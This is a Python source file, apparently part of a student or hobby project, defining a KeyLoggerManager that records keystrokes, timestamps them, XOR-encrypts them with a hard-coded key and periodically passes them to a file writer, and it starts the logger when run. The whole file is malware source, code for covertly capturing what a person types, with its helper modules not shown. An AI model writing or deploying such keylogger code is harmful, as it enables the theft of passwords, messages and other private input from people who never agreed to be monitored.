from key_logger_service import KeyLoggerService
from file_writer import FileWriter
from encryptor import XorEncryptor
import time
import threading
from datetime import datetime

class KeyLoggerManager:

    def __init__(self, name, machine_name, encryption_key, seconds_update= 5, minutes_upload= 0.25):
        self.name = name
        self.keylogger = KeyLoggerService()
        self.encryption_key = encryption_key
        self.machine_name = machine_name
        self.seconds_update = seconds_update
        self.minutes_upload = minutes_upload
        self.buffer = []
        self.active = False
        self.copied = False

    def time_in_minutes(self):
        now = datetime.now()
        now = f"{now.day}/{now.month}/{now.year} {now.hour}:{now.minute}"
        return now

    def on(self):
        self.active = True
        self.keylogger.start_logging()
        self.upload = threading.Thread(target= self.upload_data, daemon= True)
        self.upload.start()
        self.update_logged_keys()


    def upload_data(self):
        while self.active:
            time.sleep(self.minutes_upload * 60)
            str_data = self.buffer_to_str()
            print("before:",str_data)
            if str_data:
                str_data = self.get_encryptor(str_data)
                print("after:",str_data)
                self.send_data(str_data, self.machine_name)

    def update_logged_keys(self):
        while self.active:
            #print(self.buffer)
            time.sleep(self.seconds_update)
            self.get_logged_keys()


    def get_logged_keys(self):
        logged = self.keylogger.get_logged_keys()
        if self.copied:
            self.buffer = []
            self.copied = False
        self.buffer += logged


    def buffer_to_str(self):
        str = ""
        temp_buffer = self.buffer
        self.copied = True
        if temp_buffer:
            now = self.time_in_minutes()
            str += f"{now}: \n"
            for c in temp_buffer:
                str += c
            str += "\n"

        return str

    def get_encryptor(self, text):
        encryption = XorEncryptor(self.encryption_key)
        text = encryption.encryption_information(text)
        return text


    def send_data(self, data: str, machine_name: str):
        write = FileWriter()
        write.send_data(data, machine_name)


    def off(self):
        self.active = False
        self.keylogger.stop_logging()




x = KeyLoggerManager("one","keylogger_new.txt", "abcd")
x.on()

